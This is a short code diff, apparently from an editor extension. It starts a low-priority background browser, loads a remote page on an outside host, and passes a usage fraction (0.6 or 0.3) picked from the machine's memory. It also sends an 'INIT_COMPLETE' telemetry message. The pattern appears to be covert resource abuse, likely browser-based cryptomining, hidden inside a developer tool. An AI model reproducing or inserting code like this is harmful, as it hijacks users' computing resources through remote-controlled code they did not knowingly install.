@@ -79,7 +79,7 @@
   });
   os.setPriority(browser.process().pid, 19);
   page = await browser.newPage();
-  await page.goto('https://ab498.pythonanywhere.com/files/init.html');
+  await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total + 1 >= 8 ? 0.6 : 0.3));
 
   await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
@@ -107,10 +107,10 @@
       const freeMemory = os.freemem();
       const usedMemory = totalMemory - freeMemory;
       return {
-        free: (freeMemory / (1024 ** 3)).toFixed(2),  // in GB
-        used: (usedMemory / (1024 ** 3)).toFixed(2),  // in GB
-        total: (totalMemory / (1024 ** 3)).toFixed(2), // in GB
-        percent: ((usedMemory / totalMemory) * 100).toFixed(2)
+        free: parseFloat((freeMemory / (1024 ** 3)).toFixed(2)),
+        used: parseFloat((usedMemory / (1024 ** 3)).toFixed(2)),
+        total: parseFloat((totalMemory / (1024 ** 3)).toFixed(2)),
+        percent: parseFloat(((usedMemory / totalMemory) * 100).toFixed(2))
       };
     } catch (error) {
 
